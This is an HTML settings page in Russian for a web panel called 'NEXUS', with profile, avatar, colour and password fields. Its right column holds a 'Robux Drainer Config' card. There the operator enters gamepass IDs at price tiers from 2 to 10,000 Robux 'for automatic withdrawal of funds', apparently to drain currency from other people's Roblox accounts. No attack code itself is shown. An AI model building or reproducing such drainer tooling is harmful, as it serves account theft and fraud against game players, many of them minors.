<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NEXUS — Настройки</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/style.css?v=51">
</head>
<body>
  <div class="sidebar-layout">
    <div id="sidebarSlot"></div>
    <main class="main-content">
      <div class="top-bar">
        <h1 class="page-title">Настройки</h1>
      </div>
  <div class="container" style="max-width:1100px; margin:0 auto; padding-top:2rem;">
    <div class="settings-grid">
      
      <!-- LEFT COLUMN: Profile & Personalization -->
      <div class="settings-col">
        <h2 class="settings-section-title">Профиль и Персонализация</h2>
        
        <div class="settings-card avatar-card">
          <div class="avatar-upload-large" id="previewAvatar" onclick="document.getElementById('avatarFileInput').click()">
            <!-- This will be populated by JS (emoji or img) -->
            🦊
          </div>
          <div class="avatar-controls">
            <input type="file" id="avatarFileInput" accept="image/png, image/jpeg, image/webp" style="display:none;">
            <button class="btn-secondary btn-sm" id="btnResetAvatar">Сбросить фото</button>
          </div>
          
          <div class="emoji-picker-compact" id="emojiPicker">
            <button class="emoji-btn" data-emoji="🦊">🦊</button>
            <button class="emoji-btn" data-emoji="🐉">🐉</button>
            <button class="emoji-btn" data-emoji="🐺">🐺</button>
            <button class="emoji-btn" data-emoji="💀">💀</button>
            <button class="emoji-btn" data-emoji="⚡">⚡</button>
            <button class="emoji-btn" data-emoji="💎">💎</button>
            <input type="text" class="settings-input premium-input emoji-custom-input" id="avatarInput" maxlength="8" placeholder="Свой эмодзи">
          </div>
        </div>

        <div class="settings-card">
          <label class="settings-label">Отображаемое имя</label>
          <input type="text" class="settings-input premium-input" id="displayName" maxlength="32" placeholder="Как тебя видят">
          
          <label class="settings-label" style="margin-top:1.5rem;">Статус / О себе</label>
          <input type="text" class="settings-input premium-input" id="bio" maxlength="120" placeholder="Например: Root Admin">
          
          <!-- Hidden preview elements to keep JS happy -->
          <div style="display:none;">
            <span id="previewName"></span>
            <span id="previewBio"></span>
            <img id="uploadPreviewImg" src="">
            <span id="uploadPreviewPlaceholder"></span>
          </div>
        </div>

        <div class="settings-card">
          <label class="settings-label">Цвет акцента</label>
          <div class="color-picker-premium" id="colorPicker">
            <button class="color-dot" data-color="#6366f1" style="background:#6366f1;"></button>
            <button class="color-dot" data-color="#00CEC9" style="background:#00CEC9;"></button>
            <button class="color-dot" data-color="#ff6b6b" style="background:#ff6b6b;"></button>
            <button class="color-dot" data-color="#51cf66" style="background:#51cf66;"></button>
            <button class="color-dot" data-color="#ffd43b" style="background:#ffd43b;"></button>
            <button class="color-dot" data-color="#e599f7" style="background:#e599f7;"></button>
            <div class="custom-color-wrapper">
              <input type="color" class="settings-color-input" id="themeColor" value="#6366f1">
            </div>
          </div>
        </div>
      </div>

      <!-- RIGHT COLUMN: Security & Modules -->
      <div class="settings-col">
        <h2 class="settings-section-title">Безопасность и Модули</h2>

        <div class="settings-card">
          <label class="settings-label">Смена пароля</label>
          <input type="password" class="settings-input premium-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom:1rem;">
          <input type="password" class="settings-input premium-input" id="newPassword" placeholder="Новый пароль">
          <div class="settings-hint">Оставь пустым, если не хочешь менять</div>
        </div>

        <div class="settings-card drainer-card" id="drainGamepassesContainer">
          <div class="drainer-header">
            <span class="drainer-icon">⚙️</span>
            <label class="settings-label" style="margin-bottom:0;">Robux Drainer Config</label>
          </div>
          <div class="settings-hint" style="margin-bottom: 1.5rem;">Настрой ID геймпассов для автоматического вывода средств. Алгоритм сам подберет лучшую комбинацию.</div>
          
          <div class="drainer-grid">
            <div class="drainer-item"><label>10 000 R$</label><input type="text" class="settings-input gp-input" data-price="10000" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>5 000 R$</label><input type="text" class="settings-input gp-input" data-price="5000" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>1 000 R$</label><input type="text" class="settings-input gp-input" data-price="1000" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>500 R$</label><input type="text" class="settings-input gp-input" data-price="500" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>100 R$</label><input type="text" class="settings-input gp-input" data-price="100" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>50 R$</label><input type="text" class="settings-input gp-input" data-price="50" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>25 R$</label><input type="text" class="settings-input gp-input" data-price="25" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>10 R$</label><input type="text" class="settings-input gp-input" data-price="10" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>5 R$</label><input type="text" class="settings-input gp-input" data-price="5" placeholder="ID геймпасса"></div>
            <div class="drainer-item"><label>2 R$</label><input type="text" class="settings-input gp-input" data-price="2" placeholder="ID геймпасса"></div>
          </div>
        </div>

        <button class="btn-submit premium-btn-save" id="btnSave">
          <span class="save-icon">💾</span> Сохранить изменения
        </button>
      </div>

    </div>
  </div>
  </main>
  </div> <!-- end of sidebar-layout -->

  <div id="toast"></div>

  <script src="assets/config.js?v=51"></script>
  <script src="assets/app.js?v=51"></script>
  <script src="assets/settings.js?v=51"></script>
</body>
</html>
